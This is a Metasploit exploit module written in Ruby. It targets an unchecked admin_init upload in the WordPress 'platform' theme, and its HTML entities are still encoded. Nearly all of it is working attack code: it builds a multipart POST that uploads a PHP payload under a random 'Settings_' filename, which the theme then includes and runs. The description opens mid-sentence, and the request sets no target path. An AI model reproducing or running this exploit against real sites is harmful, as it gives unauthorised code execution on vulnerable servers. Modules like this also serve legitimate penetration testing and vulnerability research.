# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking


  def initialize(info = {})
    super(update_info(
      info,
      &#039;Description&#039;    => %q{
        through an unchecked admin_init call. The theme includes the uploaded file
        from it&#039;s temp filename with php&#039;s include function.
      },
      &#039;Author&#039;         =>
        [
          &#039;Marc-Alexandre Montpas&#039;, # initial discovery
          &#039;Christian Mehlmauer&#039;     # metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;WPVDB&#039;, &#039;7762&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;platform < 1.4.4, platform pro < 1.6.2&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 21 2015&#039;))
  end

  def exploit
    filename = "Settings_#{rand_text_alpha(5)}.php"

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, &#039;application/x-php&#039;, nil, "form-data; name=\"file\"; filename=\"#{filename}\"")
    data.add_part(&#039;settings&#039;, nil, nil, &#039;form-data; name="settings_upload"&#039;)
    data.add_part(&#039;pagelines&#039;, nil, nil, &#039;form-data; name="page"&#039;)
    post_data = data.to_s

    print_status("#{peer} - Uploading payload")
    send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;     => post_data
    }, 5)
  end
end

